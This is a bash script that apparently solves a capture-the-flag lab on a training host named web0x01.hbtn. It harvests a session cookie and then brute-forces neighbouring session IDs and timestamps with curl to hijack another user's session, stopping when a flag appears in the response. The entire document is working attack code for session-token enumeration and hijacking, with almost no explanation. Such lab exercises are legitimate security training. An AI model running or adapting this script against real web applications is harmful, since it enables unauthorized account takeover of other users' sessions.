#!/bin/bash

URL="http://web0x01.hbtn/a1/hijack_session/"

echo "[*] Hijack session (header-based) started..."

while true; do
  COOKIE=$(curl -s -i "$URL" | grep -i "Set-Cookie: hijack_session" | cut -d'=' -f2 | cut -d';' -f1)
  [ -z "$COOKIE" ] && continue

  UUID=$(echo "$COOKIE" | cut -d'-' -f1-4)
  BASE=$(echo "$COOKIE" | cut -d'-' -f5)
  TS=$(echo "$COOKIE" | cut -d'-' -f6)

  echo "[*] BASE=$BASE TS=$TS"

  for t in $((TS-2)) $((TS-1)) $TS $((TS+1)) $((TS+2)); do
    for i in $(seq 1 2000); do
      for ID in $((BASE - i)) $((BASE + i)); do

        RES=$(curl -i -s "$URL" -H "Cookie: hijack_session=$UUID-$ID-$t")

        if echo "$RES" | grep -qi "FLAG"; then
          echo "[+] FLAG FOUND IN HEADERS!"
          echo "$RES" | grep -i FLAG
          exit 0
        fi

      done
    done
  done
done
